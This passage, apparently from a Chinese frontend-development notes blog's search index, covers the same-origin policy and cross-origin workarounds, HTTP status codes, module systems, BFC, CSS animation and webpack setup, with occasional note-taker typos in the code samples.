func.call(this, arguments)\n        }\n      } else {\n        // 非立即执行\n        timeout = setTimeout(() => {\n          func.call(this, arguments);\n          timeout = null;\n        }, delay)\n      }\n    }\n  }\n\n  const both = debounce(pri, 500, false);\n  bothnode.addEventListener('keyup', e => {\n    both(e.target)\n  })\n~~~\n\n","tags":["js"],"categories":["furtherNotes"]},{"title":"同源策略","url":"/furtherNotes/further/02 同源策略 跨域","content":"\n> ajax 引申内容\n\n\n### 0. 为什么会有同源策略\n\n**简单来说是为了安全**\n\n1.为了防止恶意网页可以获取其他网站的本地数据。\n\n2.为了防止恶意网站[iframe](https://so.csdn.net/so/search?q=iframe&spm=1001.2101.3001.7020)其他网站的时候，获取数据。\n\n3.为了防止恶意网站在自已网站有访问其他网站的权利，以免通过cookie免登，拿到数据。\n\n\n\n### 1. 同源策略\n\n指 “协议 + 域名 + 端口” 三者相同\n\n**同源策略限制js能力，其限制的内容有：**\n\n+ Cookie、LocalStorage、indexedDB 等存储型内容\n\n+ DOM 节点\n\n+ AJAX 请求被浏览器拦截\n\n  > 请求能发出去，服务器端能收到请求并正常返回结构，结果被浏览器拦截了\n\n\n\n但**所有 src 和 href 属性都不受同源策略限制**，可以请求第三方服务器数据内容\n\n\n\n### 2. 什么情况会造成跨域 \n\n当协议、子域名、主域名、端口号中\n\n\n\n### 3. 解决跨域的方式\n\n##### 3.1 jsonp：只能解决 get 跨域\t\n\n+ 原理：**利用 script 标签的 src 属性不受同源策略限制。** 网页可以得到从其他来源动态产生的 JSON 数据，jsonp 请求一定要对方的服务器做支持才可以。\n+ 步骤：\n  1. 创建 script 标签      \n  2. src 设置 接口 url\n  3. 接口参数必须要带一个自定义参数名 不然后台无法返回数据\n  4. 通过定义函数名去接收后台返回数据\n\n\n\n##### 3.2 CORS：跨域资源共享\n\n+ 原理：**服务器设置 Access-Control-Allow-Origin 响应头后，浏览器会允许跨域请求**\n+ 限制：浏览器需要支持 html5 ，可以支持 post put 等方法，兼容ie9 以上\n\n>后台设置：\n>\n>Access-Control-Allow-Origin：*                          允许所有域名访问\n>\n>Access-Control-Allow-Origin：http://a.com      只允许 a.com 访问\n\n\n\n+ 使用这种方式解决跨域问题，会在发送请求时出现两种情况，分别为 **简单请求** 和 **复杂请求**\n\n  + **简单请求**：使用 GET、HEAD、POST 或者\n\n    ​                    Content-Type 的值仅限于 text\\plain、multipart/form-data、application/x-www-form-urlencoded\n\n    >  请求中的任意 XMLHttpRequestUpload 对象均没有注册任何事件监听器\n    >\n    > 可以使用 XMLHttpRequest.upload 属性监听\n\n  + **复杂请求**：不符合上述两个要求的请求。复杂请求的 cors 请求，会在正式通信之前，增加一次 http 查询请求，称为“预检”请求，该请求时 option 方法的，通过该请求来知道服务器是否允许跨域请求\n\n\n\n##### 3.3 postMessage\n\n是 html5 XMLHttpRequest level2 中的 api，且是为数不多的可以跨域操作的 window 属性之一\n\n可以解决：\n\n+ 页面和其打开的新窗口的数据传递\n+ 多窗口之间消息传递\n+ 页面与嵌套的iframe消息传递\n+ 上面三个场景的跨域数据传递\n\npostMessage() 方法允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文档、多窗口、跨域消息传递。\n\n`otherWindow.postMessage(message, targetOrigin, [transfer]);`\n\n\n\n##### 3.4 websocket\n\n##### 3.5 node 中间件代理\n\n##### 3.6 nginx 反向代理\n\n##### 3.7 window.name + iframe\n\n##### 3.8 location.hash + iframe\n\n##### 3.9  document.domain + iframe\n\n+ 原理：**相同主域名不同子域名下的页面，给页面设置 document.domain 为基础主域，实现同域 **\n\n  > (二级域名相同的请求下  a.text.com  b.text.com),给页面强制添加 document.domain = ‘text.com’ 表示二级域名都相同就可以实现跨域\n\n+ 限制：同域 document 提供的是页面间的互操作，需要载入 iframe 页面\n\n~~~html\n// a.html\n<body>\n helloa\n  <iframe src=\"http://b.zf1.cn:3000/b.html\" frameborder=\"0\" onload=\"load()\" id=\"frame\"></iframe>\n  <script>\n    document.domain = 'zf1.cn'\n    function load() {\n      console.log(frame.contentWindow.a);\n    }\n  </script>\n</body>\n\n// b.html\n<body>\n   hellob\n   <script>\n     document.domain = 'zf1.cn'\n     var a = 100;\n   </script>\n</body>\n\n~~~\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n##### 6.4 用Apache做转发（逆向代理），让跨域变成同域\n\n\n\n\n\n\n\n\n\n\n\n","tags":["网络"],"categories":["furtherNotes"]},{"title":"HTTP 常见状态码 - 图解HTTP","url":"/furtherNotes/further/02 常见状态码","content":"\n> ajax 引申\n\n\n#### 1xx 信息性 — 接收的请求正在处理\n\n#### 2xx 成功 — 请求正常处理完毕\n\n+ 200 OK\n+ 204 No Content   请求处理成功，返回的响应报文中 不含也不允许有 实体的主体部分，即无资源返回\n+ 206 Partial Content  客户端进行了范围请求，响应报文包含由Content-Range 指定范围的实体内容。\n\n#### 3xx 重定向 — 需要进行附加操作以完成请求\n\n+ 301 Moved Permanently 永久重定向\n\n+ 302 Found 临时重定向\n\n+ 303 See Other 因请求对应的资源存在着另一个 URI，应使用 GET 方法定向获取请求的资源\n\n  > 于302 功能相同，但明确表示采用 get 获取资源\n\n+ 304 Not Modified 发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况\n\n+ 307 Temporary Redirect 临时重定向\n\n  > 302 禁止 post 换成 get，但实际不遵守；307 会遵守浏览器标准，不会从 post 变成 get\n\n#### 4xx 客户端错误 — 服务器无法处理请求\n\n+ 400 Bad Request 请求报文中存在语法错误\n\n+ 401 Unauthorized 发送的请求需要有通过 HTTP 认证的认证信息。\n\n  >  第二次返回402表示用户认证失败。\n\n+ 403 Forbidden 对请求资源的访问被服务器拒绝了\n\n+ 404 Not Found 服务器无法找到请求的资源\n\n#### 5xx 服务器错误 — 服务器处理请求出错\n\n+ 500 Internal Server Error 服务端在执行请求时发生了错误\n+ 503 Service Unavailable 服务器暂时处于超负载或正在进行停机维护，无法处理请求\n\n\n\n\n\n\n\n\n\n","tags":["网络","HTTP"],"categories":["furtherNotes"]},{"title":"视差滚动","url":"/furtherNotes/further/03 视差滚动","content":"\n### 1. 简介\n\n**视差滚动**（Parallax Scrolling）是指让多层背景以不同的速度移动，形成立体的运动效果，带来非常出色的视觉体验。 作为网页设计的热点趋势，越来越多的网站应用了这项技术。\n\n### 2. css background-attachment\n\n`background-attachment`：决定背景图像的位置是在视口内固定，或者随着包含它的区块滚动\n\n+ **scroll** ( 默认 ) : 背景相对于元素本身固定，而不是随着内容滚动\n\n  > 背景铺满 元素盒子可视位置，内容溢出 流动条，拉滚动条，背景不动，只动内容\n\n+ **local**：背景相对于元素的内容固定。背景会随着元素内容滚动，并且背景的绘制区域和定位区域是相对于可滚动的区域而不是包含他们的边框。\n\n  > 背景铺满  元素可视 or 流动条隐藏部分，相当于内容与背景的相对位置静止。\n\n+ **fixed**：背景相对于视口固定。背景不会随着元素的内容滚动。\n\n\n\n视察滚动的实现：\n\n~~~css\n.g-img {\n    background-image: url(...);\n    background-attachment: fixed;\n    background-size: cover;\n    background-position: center center;\n}\n~~~\n\n\n\n### 3. transform：translate3d\n\n1. 我们给容器设置上 `transform-style: preserve-3d` 和 `perspective: xpx`，那么处于这个容器的子元素就将位于3D空间中，\n\n2. 再给子元素设置不同的 `transform: translateZ()`，这个时候，不同元素在 3D Z轴方向距离屏幕（我们的眼睛）的距离也就不一样\n\n3. 滚动滚动条，由于子元素设置了不同的 `transform: translateZ()`，那么他们滚动的上下距离 `translateY` 相对屏幕（我们的眼睛），也是不一样的，这就达到了滚动视差的效果。\n\n","tags":["css"],"categories":["furtherNotes"]},{"title":"展开讲讲红宝书提到的“es中...按值传递”","url":"/furtherNotes/further/01 es 中函数的参数都是按值传递的","content":"\n> 第4版红宝书 4.1 提到 ECMAScript 中所有函数的值都是按值传递的 \n\n\n\n### 按值传递\n\n>  原始值 很好理解，就是将值拷贝一份 成为参数，这个参数与外界原来的值，就没有任何联系了\n\n这里展开讲讲引用值\n\n\n\n~~~js\nlet person = { \n    age: 18 \n}\nfunction add (per) {\n    per.age++;\n    console.log(per);\n}\n\nadd(person);        // { age: 19 }\nconsole.log(person) // { age: 19 }\n~~~\n\n 这个例子的输出结果显然 就不符合 **按值传递**，是不是意味着 应该是 **按引用传递**呢？我们再看一个例子：\n\n~~~js\nlet person = {\n    age: 18\n}\nfunction add(per){\n    per = 20;\n    console.log(per);\n}\n\nadd(person);         //20\nconsole.log(person); // { age: 18 }\n~~~\n\n这个例子的输出结果就有点 **按值传递** 了。\n\n\n\n那为什么会有这两种这么迷惑的结果呢？这就引出了第三种值的传递方式：**按共享传递**。\n\n顺便回顾下我们上面有说到的两种值的传递方式：\n\n+ **按值传递**：把值复制给另一个变量\n+ **按引用传递**：把引用对象传给另一个变量，想到于两个变量指向同一个引用\n\n+ **按共享传递**：把对象的引用副本传递给另一个变量\n\n\n\n**所以，就上面的例子来说，修改 `per.age` 会直接修改到原值，但直接修改 `per` 并不会修改原值。**\n\n\n\n其实拷贝副本也算是一种值的拷贝，所以红宝书直接认为是按值传递也没有说不过去。\n\n\n\n总结：若参数为 原始类型 就是  按值传递，若参数为 引用类型 就是 按共享传递\n\n\n\n","tags":["js"],"categories":["furtherNotes"]},{"title":"Ajax","url":"/furtherNotes/further/02 ajax","content":"\n\n## Ajax\n\n### 1.简介\n\najax(asynchronous javascript and xml) 异步 js 与 xml\n\n一种创建交互式网页应用的网页开发技术\n\n使用异步方式与服务器通信，不需要打断用户操作\n\n在不刷新整个网页情况下，与服务器通信交互\n\n\n\n### 2. 特点\n\n+ 优点：可以不刷新页面与服务端进行通信\n\n  ​           允许根据用户事件来更新部分页面内容\n\n+ 缺点：没有浏览记录，不能回退\n\n  ​            存在同源跨域问题\n\n  ​             seo不友好\n\n\n\n### 3. 原生ajax使用\n\n1. 创建对象\n\n2. 初始化 设置请求方法和url\n\n3. 发送 设置参数\n\n   > get：请求数据拼在 url 中\n   >\n   > post：设置请求头 格式内容 + 请求数据放在 send 里\n   >\n   > ​           xhr.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"); \n\n4. 事件绑定 处理服务端返回结果\n\n   \n\n~~~js\nconst xml = new XMLHttpRequest();\nxhr.responseType = 'json';   // open前 设置响应体数据\nxhr.timeout = 2000;\nxhr.ontimeout = function(){...}\nxhr.onerror = function(){...}\nxhr.open('GET','http://....');\nxhr.send();\nxhr.onreadystatechange = function(){\n    if(xhr.readyState == 4 && xhr.status == 200){\n        xhr.status; //状态码\n        xhr.statusText; //状态码字符串\n        xhr.getAllResponseHeaders();  //所有响应头\n        xhr.response; //响应体\n    }\n}\n~~~\n\n> xhr.abort()\n\n\n\n### 4. readyState \n\n表示请求发送的状态 0 1 2 3 4\n\n0：未初始化 — 初始状态\n\n1：启动 — open后\n\n2：发送 — send后\n\n3：接收 — 返回了部分数据\n\n4：完成 — 返回了所有数据\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["js"],"categories":["furtherNotes"]},{"title":"模块化历程","url":"/furtherNotes/further/01 模块化历程","content":"\n> 项目涉及到的模块化\n>\n> [参考的主要链接](https://juejin.cn/post/6844903744518389768)\n\n# 前端模块化：CommonJS、AMD、CMD、ES6\n\n## 1.模块化的理解\n\n+ 将一个复杂的程序依据一定的规则(规范)封装成几个块（文件），并进行组合在一起\n+ 块的内部数据与实现是私有的，只是想外部暴露一些接口（方法）与外部其他模块通信\n\n## 2.模块化进化过程\n\n#### 2.1 全局 function 模式\n\n+ 编码：将不同的功能封装成不同的全局函数\n+ 问题：污染全局命名空间，容易引擎命名冲突或数据不安全，模块成员之间看不出关系\n\n#### 2.2 namespace 模式\n\n+ 编码：将不同功能封装在对象属性里\n\n+ 作用：解决了全局变量，解决命名冲突\n\n+ 问题：数据不安全，会暴露所有模块成员，内部成员状态可以被外部改写\n\n  ~~~js\n  let myModule = {\n      name:'qsh',\n      foo() {\n          console.log(`foo ${ this.data }`);\n      }\n  }\n  myModule.data = 'qrc'\n  myModule.foo()  // foo qrc\n  ~~~\n\n#### 2.3 IIFE 模式：匿名函数子调用（闭包）\n\n+ 编码：将数据和行为封装到一个函数内部，通过给window添加属性来向外暴露成员\n\n+ 作用：数据私有，外部只能通过暴露的方法操作\n\n+ 问题：如果当前模块怎么依赖另一个模块\n\n  ~~~html\n  <script src='module.js'></script>\n  <script>\n  \tmyModule.foo() // foo qsh\n  </script>\n  ~~~\n\n  ~~~js\n  // module.js\n  (function(window){\n      let data = 'qsh';\n      function(){\n          console.log(`foo ${ this.data }`)\n      }\n      window.myModule = { foo }\n  })\n  ~~~\n\n#### 2.4 IIFE 模式增强：引入依赖\n\n+ 现在模块化的基石\n\n+ 好处：保证了模块的独立性，使得模块之间的依赖关系变得明显\n\n  ~~~js\n  // module.js\n  (function(window,$){\n      let data = 'qsh';\n      function(){\n          console.log(`foo ${ this.data }`);\n          $('body').css('background','red');\n      }\n      window.myModule = { foo }\n  })(window,jQuery)\n  ~~~\n\n  ~~~html\n    <!-- 引入的js必须有一定顺序 -->\n    <script src=\"jquery-1.10.1.js\"></script>\n    <script src=\"module.js\"></script>\n    <script>\n      myModule.foo() // foo qsh\n    </script>\n  ~~~\n\n\n\n## 3.模块化的好处\n\n+ 避免命名冲突，减少命名空间污染\n+ 更好分离，按需加载\n+ 更高复用性\n+ 高可维护性\n\n\n\n## 4. 引入多个`<script>`后出现的问题\n\n+ 请求过多\n\n  > 要依赖多个模块，这就会发送多个请求，导致请求过多\n\n+ 依赖模糊\n\n  > 不知道具体的依赖关系，有可能因此导致加载先后顺序出错\n\n+ 难以维护\n\n  > 以上原因导致了难维护性。\n\n  模块化固然有多个好处，然而一个页面需要引入多个js文件，就会出现以上问题，这些问题可以通过模块化规范来解决。\n\n\n\n## 5.模块化规范\n\n### 5.1 CommonJS\n\n##### 5.1.1 概述\n\nNode 应用由模块组成，采用CommonJS 模块规范，每个文件就是一个模块，有自己的作用域。\n\n**加载模块是同步的，只有加载完成，才能执行后面的操作。**\n\n**在服务器端，模块的加载时运行时同步加载的；**\n\n**在浏览器端，模块需要提前编译打包处理。**\n\n\n\n##### 5.1.2 特点\n\n+ 所有代码都运行在模块作用域，不会污染全局作用域\n+ 模块可以多次加载，但只会在第一次加载时运行一次，然后运行结果会被缓存，再此加载的时候，就直接读取缓存结果。若要让模块再次加载，必须清除缓存。\n+ 模块的加载顺序，按照其在代码出现的顺序\n\n\n\n##### 5.1.3 基本语法\n\n+ 导出：`module.exports = value` 或 `exports.xxx = value`\n\n+ 导入：`require(xxx)`\n\n  > if 第三方模块 xxx 为模块名；if 自定义模块 xxx 为文件路径\n\n\n\n##### 5.1.4 问题\n\n**Q:** **CommonJS 暴露的模块是什么？**\n\n**A:** CommonJS 规范规定，每个模块内部，module 代表当前模块，module.exports 是对外的接口。**加载某个模块，其实是加载该模块的 module.exports 属性**。\n\n\n\n**Q:** require 命令用来干什么？\n\n**A:** 用于**加载模块文件**。其基本功能是，**读入并执行一个 JavaScript 文件，然后返回该模块的 exports 对象。如果没有发现指定模块，会报错。**\n\n\n\n##### 5.1.5 模块的加载机制\n\n输入的是被输出的值的拷贝。模块内部的变化就影响不到这个输出的值。\n\n> 其实是 **按值传递(原始类型) 和 [按共享传递(引用类型)](./es 中函数的参数都是按值传递的.md)**\n\n这与ES6模块化有重大差异。\n\n\n\n##### 5.1.6 服务器端实现\n\n1. 下载 node.js\n2. 创建项目结构 npm init （package name 不能有中文名）\n3. 下载第三方模块 npm install uniq –save\n4. 定义模块代码\n5. 运行 js 代码 node xxx.js\n\n\n\n##### 5.1.7 浏览器端实现\n\n1. 创建项目结构 dist + src + index.html + package.json\n2. 下载 browserify 全局 -g 局部 –save-dev\n3. 定义模块代码 借助 browserify 打包 xxx.js 文件打包编译，（直接导入html 会报错）\n4. 导报处理js  根目录运行 browserify js/src/app.js -o js/dist/bundle.js\n5. index.html 引入` <script type=\"text/javascript\" src=\"js/dist/bundle.js\"></script>`\n\n\n\n### 5.2 AMD\n\n##### 5.2.1 概述\n\nCommonJS 加载模块是同步的，只有加载完成，才能执行后面的操作。\n\n**AMD 则是非同步加载模块，允许指定回调函数。**\n\n\n\n##### 5.2.2 特点\n\n+ 定义方法非常清晰\n+ 不会污染全局变量\n+ 清楚显示依赖关系\n+ 可用于浏览器环境，允许非同步加载模块，指定回调函数，可以根据动态加载模块\n\n\n\n##### 5.2.3 适用情况\n\n因为 **node.js** 主要用于服务器编程，模块文件已经存在本地硬盘，所以加载比较块，不用考虑非同步加载的方式，所以 **CommonJS 比较适用**。\n\n如果是浏览器环境，要从服务器端加载模块，就必须采用非同步，因此**浏览器一般采用 AMD**。\n\n> AMD 比 CommonJS 在浏览器端实现 早\n\n\n\n##### 5.2.4 基本语法\n\n+ 导出：\n\n  ~~~js\n  // 定义没有依赖的模块\n  define(function(){\n      return 模块\n  })\n  \n  // 定义有依赖的模块\n  define(['module1','module2'],function(m1,m2){\n      return 模块\n  })\n  ~~~\n\n+ 导入：\n\n  ~~~js\n  require(['module1','module2'],function(m1,m2){\n      ...\n  })\n  ~~~\n\n\n\n##### 5.2.5 使用require.js\n\n> RequireJS 是一个工具库，主要用于客户端的模块管理。其遵守 AMD 规范。**其基本思想是，通过 define 方法，将代码定义为模块；通过 require 方法，实现代码的模块加载。**\n\nAMD 在浏览器实现的步骤：\n\n1. 下载引入 require.js  [官网](http://www.requirejs.cn/) [github](https://github.com/requirejs/requirejs) \n\n   将 require.js 导入项目： js/libs/require.js\n\n2. 创建项目结构  js > libs + module + main.js      < + index.html\n\n3. 定义 require.js 的模块代码\n\n   ~~~js\n   // data.js\n   define(function(){\n       function getmsg(){\n           return 'data'\n       } \n       return { getmsg };\n   })\n   \n   //alterdata.js\n   define(['data','jquery',function(data,$){\n       function showmsg(){\n           alter(data.getmsg());\n           $('body').css('background', 'green')\n       }\n       return { showmsg };\n   }])\n   \n   //main.js\n   (function(){\n       require.config({\n           baseUrl:'js/',\n           path:{      // 映射\n               alterdata:'./modules/alterdata',\n               data:'./module/data',\n               jquery:'./libs/jquery-1.10.1'   //jQuery 报错\n           }\n       })\n       require(['alterdata'],function(alterdata){\n           alterdata.showmsg()\n       })\n   })()\n   ~~~\n\n   ~~~html\n   <script data-main=\"js/main\" src=\"js/libs/require.js\"></script>\n   ~~~\n\n   \n\n### 5.3 CMD\n\n##### 5.3.1 基本概念\n\n**CMD 专门用于浏览器端，模块异步加载，使用时才会加载执行**。其整合了 CommonJS 和 AMD 的特点。在 Sea.js 种，所有 JavaScript 模块都遵循 CMD 规范。\n\n\n\n##### 5.3.2 基本语法\n\n+ 导出：\n\n  ~~~js\n  // 定义没有依赖的模块\n  define(function(require, exports, module){\n      exports.xxx = val;\n      module.exports = val;\n  })\n  \n  // 定义有依赖的模块\n  define(function(require, exports, module){\n      // 同步引入依赖模块\n      const module2 = require('./module2')\n      // 异步引入依赖模块\n      require.async('./module3',(m3) => {\n          \n      })\n      \n      exports.xxx = val;\n  })\n  ~~~\n\n+ 导入：\n\n  ~~~js\n  define(function(require){\n      let m1 = require('./module1');\n      m1.show()\n  })\n  ~~~\n\n\n\n##### 5.3.3 sea.js 使用\n\n1. 下载sea.js 并引入 js/libs/sea.js  [官网](seajs.org/)  [github](github.com/seajs/seajs)\n\n2. 创建项目结构  js > libs + module < +  index.html\n\n3. 定义sea.js 模块代码\n\n4. 引入index.html \n\n   ~~~html\n   <script type=\"text/javascript\" src=\"js/libs/sea.js\"></script>\n   <script type=\"text/javascript\">\n     seajs.use('./js/modules/main')\n   </script>\n   ~~~\n\n   \n\n### 5.4 ES6\n\n##### 5.4.1 基本概念\n\nES6 模块的设计思想是**尽量的静态化**，使得**编译时就能确定模块的依赖关系，以及输入和输出的变量**。CommonJS 和 AMD 都只能在**运行时**确定这些东西。比如，CommonJS 模块就是对象，输入时必须查找对象属性。\n\n\n\n##### 5.4.2 ES6 模块化语法\n\n+ 导出：export { xxx }  / export default xxx\n+ 导入：import { xxx } from …   /  import xxx from …\n\n\n\n##### 5.4.3 <font color='red'>ES6 模块与 CommonJS 模块的差异</font>\n\n1. **CommonJS 输出的是值的拷贝；ES6 Module 输出的是值的引用**\n\n   > ES6 Module 的运行机制与 CommonJS 不一样。**ES6 Module 是动态引用，并且不会缓存值，模块里面的变量绑定其所在的模块。**\n\n2. **CommonJS 是运行时加载；ES6 Module 时编译时输出接口**\n\n   > 因为 CommonJS 加载的是一个对象，即 module.exports 属性，该对象只有在脚本运行完才会生成。\n   >\n   > 而 ES6 Module 不是对象，它的对外接口只是一种静态定义，在代码静态解析阶段就会生成\n\n\n\n##### 5.4.4  ES6-Babel-Browserify 使用\n\n使用 Babel 将 ES6 编译为 ES5 代码，使用 Browserify 编译打包js\n\n1. 定义package.json 文件\n2. 安装babel-cil，babel-preset-es2015 和 browserify\n3. 定义 .babelrc 文件 \n4. 定义模块代码\n5. 导入index.html\n\n\n\n## 6. 总结\n\n+ CommonJS规范主要用于**服务端编程**，加载模块是**同步**的，有缓存，这并不适合在浏览器环境，因为**同步意味着阻塞加载，浏览器资源是异步加载的**，因此有了AMD CMD解决方案。\n+ AMD规范在**浏览器环境中异步加载模块**，而且可以**并行加载**多个模块。不过，AMD规范开发成本高，代码的阅读和书写比较困难，模块定义方式的语义不顺畅。\n+ CMD规范与AMD规范很相似，都用于**浏览器编程**，**依赖就近，延迟执行**，可以很容易在Node.js中运行。不过，依赖　SPM 打包，模块的加载逻辑偏重。\n+ **ES6 在语言标准的层面上，实现了模块功能，而且实现得相当简单，完全可以取代 CommonJS 和 AMD 规范，成为浏览器和服务器通用的模块解决方案**。\n\n\n\n\n\n\n\n\n\n\n\n","tags":["js","es6"],"categories":["furtherNotes"]},{"title":"BFC 和 触发BFC","url":"/furtherNotes/further/BFC 和 触发BFC","content":"\n\n#### 1.常见定位方案\n\n- 普通流 (normal flow)\n\n> 在普通流中，元素按照其在 HTML 中的先后位置至上而下布局，在这个过程中，行内元素水平排列，直到当行被占满然后换行，块级元素则会被渲染为完整的一个新行，除非另外指定，否则所有元素默认都是普通流定位，也可以说，普通流中元素的位置由该元素在 HTML 文档中的位置决定。\n\n- 浮动 (float)\n\n> 在浮动布局中，元素首先按照普通流的位置出现，然后根据浮动的方向尽可能的向左边或右边偏移，其效果与印刷排版中的文本环绕相似。\n\n- 绝对定位 (absolute positioning)\n\n> 在绝对定位布局中，元素会整体脱离普通流，因此绝对定位元素不会对其兄弟元素造成影响，而元素具体的位置由绝对定位的坐标决定。\n\n\n\n#### 2.BFC是什么\n\n**块格式化上下文（Block Formatting Context，BFC）** 是Web页面的可视CSS渲染的一部分，是块盒子的布局过程发生的区域，也是浮动元素与其他元素交互的区域。属于上述定位方案的普通流。\n\n> **具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。**\n>\n> 通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。\n\n\n\n#### 3.触发/创建 BFC\n\n简洁版：\n\n+ body根元素\n+ 浮动元素：float 除 none 以外的值\n+ 绝对定位元素：position (absolute、fixed)\n+ display ( inline-block、table-cells、flex )\n+ overflow 除 visible 以外的值 ( hidden、auto、scroll )\n\n\n\n详细版：\n\n> - 根元素（`<html>`）\n> - 浮动元素（元素的 `float` 不是 `none`）\n> - 绝对定位元素（元素的 `position` 为 `absolute` 或 `fixed`）\n> - 行内块元素（元素的 `display`为 `inline-block`）\n> - 表格单元格（元素的 `display`为 `table-cell`，HTML表格单元格默认为该值）\n> - 表格标题（元素的 `display`为 `table-caption`，HTML表格标题默认为该值）\n> - 匿名表格单元格元素（元素的 `display`为 `table`、`table-row`、 `table-row-group`、`table-header-group`、`table-footer-group`（分别是HTML table、row、tbody、thead、tfoot 的默认属性）或 `inline-table`）\n> - `overflow` 计算值(Computed)不为 `visible` 的块元素\n> - `display`值为 `flow-root` 的元素\n> - `contain` 值为 `layout`、`content `或 `paint` 的元素\n> - 弹性元素（`display` 为 `flex` 或 `inline-flex `元素的直接子元素）\n> - 网格元素（`display`为 `grid` 或 `inline-grid` 元素的直接子元素）\n> - 多列容器（元素的 `column-count` 或 `column-width` (en-US)不为 `auto，包括 ``column-count` 为 `1`）\n> - `column-span` 为 `all` 的元素始终会创建一个新的BFC，即使该元素没有包裹在一个多列容器中（标准变更，Chrome bug）。\n>\n> 块格式化上下文包含创建它的元素内部的所有内容.\n\n\n\n\n\n#### 4.BFC 特性及其应用\n\n+ 同一个  BFC 下外边距会发生折叠\n\n  > 解决外边距塌陷：将其放在不同的 BFC 容器中\n\n+ BFC 可以包含浮动的元素\n\n  > 清除浮动：父元素触发 BFC\n\n+ BFC 可以阻止元素被浮动元素覆盖\n\n","tags":["css"],"categories":["furtherNotes"]},{"title":"CSS3 animate","url":"/learningNotes/further/animate 动画","content":"\n## CSS3 animate\n\n**CSS animations** 使得可以将从一个CSS样式配置转换到另一个CSS样式配置。动画包括两个部分:描述动画的样式规则和用于指定动画开始、结束以及中间点样式的关键帧。\n\n#### 制作动画\n\n1. 定义动画\n\n   ~~~css\n   @keyframs myanimate{\n       0%{}\n       100%{}\n   }\n   ~~~\n\n2. 使用动画\n\n   ~~~css\n   div{\n       ...\n       animation:name duration timing-function delay iteration-count direction fill-mode;\n     /*动画名 持续时间 运动曲线 何时开始 播放次数 是否反方向 动画起始或者结束的状态*/\n       /* 简写不包括 play-state 运行还是暂停 */\n   }\n   ~~~\n\n\n\n#### 常见属性\n\n| 属性                      | 描述                                                        |\n| ------------------------- | ----------------------------------------------------------- |\n| @keyframes                | 规定动画                                                    |\n| animation                 | 所有动画的简写属性，除了animation-play-state属性            |\n| animation-name            | 规定@keyframes动画的名称（必须）                            |\n| animation-duration        | 规定动画完成一个周期所花费的秒或毫秒，默认为0（必须）       |\n| animation-timing-function | 规定动画是的速度曲线，默认为ease                            |\n| animation-delay           | 规定动画合适开始，默认是0                                   |\n| animation-iteration-count | 规定动画播放的次数，默认1，还有ifinite（无限）              |\n| animation——direction      | 规定动画是否在下一周逆向播放，默认为normal，逆播放alternate |\n| animation-play-state      | 规定动画是否正在运行或停止，默认running 还有paused          |\n| animation-fill-mode       | 规定动画结束后状态，保持forwards回到起始backwards           |\n\n\n\n#### 总结：\n\n简写属性不包括animation-play-state\n\t          暂停动画：animation-play-state：puased；经常和鼠标经过等其他配合使用\n\t          想要动画走回来，而不是直接跳回来：animation-direction：alternate；\n\t          盒子动画结束后，停在结束位置：animation-fill-mode：forwards；\n\n","tags":["css"],"categories":["learningNotes"]},{"title":"webpack 学习笔记","url":"/learningNotes/webpack","content":"\n\n## 0. atguigu 视频 的第三方包的版本\n\n#### 0.1 创建项目 初始化项目\n\nnpm init\n\n#### 0.2 包版本\n\n##### 全局安装 -g 和 本地安装 -D : \n\n+ webpack@4.41.6           我下的—5.52.1\n\n+ webpack-cli@3.3.11                 —4.8.0\n\n##### loader 和一些 pulgin 插件：\n\n###### 1. 处理css：\n\ncss-loader@3.4.2   —6.2.0\n\nstyle-loader@1.1.3  —3.2.1\n\n###### 2. 处理less\n\nless-loader@5.0.0   —10.0.1\n\nless@3.11.1  —4.1.1\n\n###### 3. 处理html\n\nhtml-webpack-plugin@3.2.0   —5.3.2\n\n###### 4. 处理img\n\nurl-loader@3.0.0   —4.1.1\n\nfile-loader@5.0.2   —6.2.0\n\n###### 5. 处理html img\n\nhtml-loader@0.5.5   —2.1.2\n\n###### 6. devServer\n\nwebpack-dev-server@3.10.3   —4.2.0\n\n###### 7. 分离css\n\nmini-css-extract-plugin@0.9.0\n\n###### 8. css兼容\n\npostcss-roader@3.0.0\n\npostcss-preset-env@6.7.0\n\n###### 9. css压缩\n\noptimize-css-assets-webpack-plugin@5.0.3\n\n###### 10. js兼容\n\nbabel-roader@8.0.6\n\n@babel-preset-env@7.4.8\n\n@babel/core@7.8.4\n\n@babel-polyfill@7.8.3\n\ncore-js@3.6.4\n\n###### 11. pwa\n\nworkbox-webpack-plugin@5.0.0\n\nserve@11.3.0\n\n###### 12. 多进程\n\nthread-roader@2.1.3\n\n###### 13. dll\n\nadd-asset-html-webpack-plugin@3.1.3\n\n\n\nterser-webpack-plugin@2.3.5\n\n\n\n## 1.webpack 开发环境配置\n\n### 1.1 基本配置\n\n~~~js\nconst { resolve } = require('path');\n\nmodule.exports = {\n  // 入口起点\n  entry: './src/js/index.js',\n  // 输出\n  output: {\n    filename: 'bulit.js',\n    path: resolve(__dirname, 'build')\n  },\n  // loader配置\n  module: {\n    rules: [\n      // 详细loader配置\n    ]\n  },\n  // plugins插件的配置\n  plugins: [\n\n  ],\n  mode: 'development',\n  // mode: 'production',\n}\n~~~\n\n### 1.2 loader的配置\n\n#### 1.2.1 css\n\n~~~js\n // 配置css\n      {\n        // 匹配了哪些文件\n        test: /\\.css$/,\n        // 使用了哪些loader进行处理\n        use: [\n          // use数组中 loader的执行顺序:从右到左  从下到上\n          // 创建 style 标签，将js中的样式资源插入到head中\n          'style-loader',\n          // 将css文件变化 commonjs 模块加载到js中 里面的内容样式是字符串\n          'css-loader'\n        ]\n      },\n~~~\n\n\n\n#### 1.2.2 less\n\n~~~js\n //配置less 要加上上面配置的css\n      {\n        test: /.\\less$/,\n        // 最后一个 将less 编译成css 文件 \n        // 需要下载 less-loader less\n        use: ['style-loader', 'css-loader', 'less-loader']\n      },\n~~~\n\n\n\n#### 1.2.3 图片\n\n~~~js\n//配置图片资源  默认处理不了 html 中的img\n        {\n          test: /\\.(jpg|png|gif|jpeg)$/,\n          // 使用一个loader时 可以直接用下面这种方法\n          // 下载 url-loader file-loader-> 不用下载\n          loader: 'url-loader',\n          options: {\n            publicPath: './img',\n            outputPath: 'img',\n            // 